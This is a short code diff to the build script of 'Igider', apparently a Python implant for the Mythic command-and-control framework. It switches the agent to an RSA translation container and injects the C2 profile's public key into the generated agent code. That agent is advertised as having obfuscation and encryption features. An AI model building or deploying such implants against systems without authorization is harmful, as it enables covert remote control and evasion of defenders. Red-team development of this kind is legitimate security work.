@@ -29,7 +29,7 @@ class Igider(PayloadType):
     wrapper = False
     wrapped_payloads = ["pickle_wrapper"]
     mythic_encrypts = False
-    translation_container = "SecureTranslation"
+    translation_container = "rsaTranslator"
     note = "Production-ready Python agent with advanced obfuscation and encryption features"
     supports_dynamic_loading = True
     
@@ -346,7 +346,10 @@ class Igider(PayloadType):
         build_errors = []
         
         try:
-
+            # Mythic gives you the keys generated in translator.generate_keys
+            pubkey_bytes = self.build_parameters["c2_profile"].enc_key  # EncryptionKey
+            # decode if necessary
+            pubkey_str = pubkey_bytes.decode() if isinstance(pubkey_bytes, bytes) else pubkey_bytes
             # Step 1: Initialize build
             await self.update_build_step("Initializing Build", "Starting build process...")
             # Step 2: Gather components
@@ -495,7 +498,8 @@ class Igider(PayloadType):
             base_code = base_code.replace("CRYPTO_MODULE_PLACEHOLDER", crypto_code)
             base_code = base_code.replace("UUID_HERE", self.uuid)
             base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
-            
+            base_code = base_code.replace("PUBLIC_KEY_PLACEHOLDER", pubkey_str)
+
             
                 # Process C2 profile configuration
             for c2 in self.c2info:
